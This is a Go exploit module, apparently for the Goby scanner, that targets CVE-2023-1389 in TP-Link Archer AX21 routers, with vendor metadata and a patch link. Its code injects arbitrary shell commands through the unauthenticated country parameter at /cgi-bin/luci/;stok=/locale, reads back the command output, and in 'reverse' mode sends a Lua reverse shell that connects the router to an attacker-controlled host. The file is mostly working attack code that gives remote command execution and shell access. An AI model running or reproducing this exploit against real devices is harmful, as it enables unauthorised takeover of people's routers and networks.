package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "TP-Link Archer AX21 (AX1800) country remote command execution vulnerability (CVE-2023-1389)",
    "Description": "<p>TP-Link Archer AX21 (AX1800) is a high-speed and convenient wireless router.</p><p>The TP-Link Archer AX21 (AX1800) web management interface /cgi-bin/luci;stok=/locale endpoint country parameter is not sanitized before calling popen(), allowing an unauthenticated attacker to inject via a simple POST request Execute arbitrary commands to gain server permissions.</p>",
    "Product": "TP-Link-Archer-AX21",
    "Homepage": "https://www.tp-link.com/us/support/download/archer-ax21",
    "DisclosureDate": "2023-03-14",
    "Author": "h1ei1",
    "FofaQuery": "body=\"/cgi-bin/luci/;stok=/locale\"",
    "GobyQuery": "body=\"/cgi-bin/luci/;stok=/locale\"",
    "Level": "2",
    "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.tp-link.com/us/support/download/archer-ax21/v3/#Firmware.\">https://www.tp-link.com/us/support/download/archer-ax21/v3/#Firmware.</a></p>",
    "References": [
        "https://www.tenable.com/security/research/tra-2023-11"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-1389"
    ],
    "CNNVD": [
        "CNNVD-202303-1280"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.8",
    "Translation": {
        "CN": {
            "Name": "TP-Link Archer AX21 (AX1800) country 远程命令执行漏洞（CVE-2023-1389）",
            "Product": "TP-Link-Archer-AX21",
            "Description": "<p>TP-Link Archer AX21 (AX1800) 是一款高速便捷的无线路由器。<br></p><p>TP-Link Archer AX21 (AX1800) Web 管理界面 /cgi-bin/luci;stok=/locale 端点 country 参数在调用 popen() 之前未经过清理，从而允许未经身份验证的攻击者通过简单的 POST 请求注入执行任意命令获取服务器权限。<br></p>",
            "Recommendation": "<p>厂商已发布安全补丁，请及时关注官网更新：<a href=\"https://www.tp-link.com/us/support/download/archer-ax21/v3/#Firmware\">https://www.tp-link.com/us/support/download/archer-ax21/v3/#Firmware</a>。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "TP-Link Archer AX21 (AX1800) country remote command execution vulnerability (CVE-2023-1389)",
            "Product": "TP-Link-Archer-AX21",
            "Description": "<p>TP-Link Archer AX21 (AX1800) is a high-speed and convenient wireless router.</p><p>The TP-Link Archer AX21 (AX1800) web management interface /cgi-bin/luci;stok=/locale endpoint country parameter is not sanitized before calling popen(), allowing an unauthenticated attacker to inject via a simple POST request Execute arbitrary commands to gain server permissions.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.tp-link.com/us/support/download/archer-ax21/v3/#Firmware.\">https://www.tp-link.com/us/support/download/archer-ax21/v3/#Firmware.</a><br></p>",
            "Impact": "<p>Attackers can use this vulnerability to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-25",
    "PocId": "10861"
}`

	sendPayload1a19759f := func(u *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/cgi-bin/luci/;stok=/locale?form=country")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Data = "operation=write&country=" + url.QueryEscape(cmd)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")

		return httpclient.DoHttpRequest(u, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(8)
			// 利用方式较为特殊，对发包顺序有要求，为了保证准确需要重复发包
			go sendPayload1a19759f(u, "$(echo "+checkStr+" > /www/"+checkStr+".txt)")
			go sendPayload1a19759f(u, "$(echo "+checkStr+" > /www/"+checkStr+".txt)")
			// 循环检测
			for i := 0; i < 5; i++ {
				cfgCheck := httpclient.NewGetRequestConfig("/" + checkStr + ".txt")
				cfgCheck.VerifyTls = false
				cfgCheck.FollowRedirect = false
				rsp, _ := httpclient.DoHttpRequest(u, cfgCheck)
				if rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) {
					return true
				} else {
					time.Sleep(1 * time.Second)
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			cmd := goutils.B2S(ss.Params["cmd"])
			if attackType == "cmd" {
				// 重复发包以触发命令执行
				go sendPayload1a19759f(expResult.HostInfo, "$("+cmd+" > /www/executeresult.txt 2>&1)")
				go sendPayload1a19759f(expResult.HostInfo, "$("+cmd+" > /www/executeresult.txt 2>&1)")
				for i := 0; i < 5; i++ {
					cfgCheck := httpclient.NewGetRequestConfig("/executeresult.txt")
					cfgCheck.VerifyTls = false
					cfgCheck.FollowRedirect = false
					rsp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgCheck)
					if err != nil {
						expResult.Success = false
						expResult.Output = err.Error()
						return expResult
					} else if rsp.StatusCode == 200 && len(rsp.Utf8Html) > 0 {
						expResult.Success = true
						expResult.Output = rsp.Utf8Html
						return expResult
					}
					// sleep 1s
					time.Sleep(1 * time.Second)
				}
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil || len(rp) == 0 {
					expResult.Success = false
					expResult.Output = err.Error()
				} else {
					addr := godclient.GetGodServerHost()
					ip := net.ParseIP(addr)
					if ip != nil {
						addr = ip.String()
					} else {
						ips, err := net.LookupIP(addr)
						if err != nil {
							expResult.Success = false
							expResult.Output = err.Error()
						}
						addr = ips[0].String()
					}
					cmd = "$(lua -e \"local s=require('socket');local t=assert(s.tcp());t:connect('" + addr + "'," + rp + ");while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\")"
					// 重复发包以触发命令执行
					go sendPayload1a19759f(expResult.HostInfo, cmd)
					go sendPayload1a19759f(expResult.HostInfo, cmd)
					select {
					case webConsoleId := <-waitSessionCh:
						if u, err := url.Parse(webConsoleId); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							expResult.Output = `<br/> <a href="goby://sessions/view?sid=` + strings.Join(u.Query()["id"], "") + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 10):
						expResult.Success = false
						expResult.Output = "反弹失败，请确认目标是否出网"
					}
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
